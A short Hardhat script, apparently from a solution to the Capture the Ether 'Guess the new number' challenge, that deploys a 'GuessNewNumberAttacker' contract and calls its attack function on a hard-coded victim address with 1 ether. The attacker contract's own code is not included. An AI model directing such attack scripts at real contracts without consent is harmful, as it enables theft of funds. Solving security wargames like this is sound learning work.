require("@nomiclabs/hardhat-ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    accounts = await ethers.getSigners();
    eoa = accounts[0];
    const factory =  await ethers.getContractFactory("GuessNewNumberAttacker")
    const atacante = await factory.deploy()
    
    console.log("Attacker SC deployed")
    const victima = "0x6855Ba239d2Db23c89703D547C3630f5867C5A48"
    
    const tx = await atacante.attack(
      victima,
      {value: ethers.utils.parseEther('1'),
       gasPrice: ethers.utils.parseUnits('15','gwei'),
       gasLimit: 500000,
      });
    await tx.wait()


}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
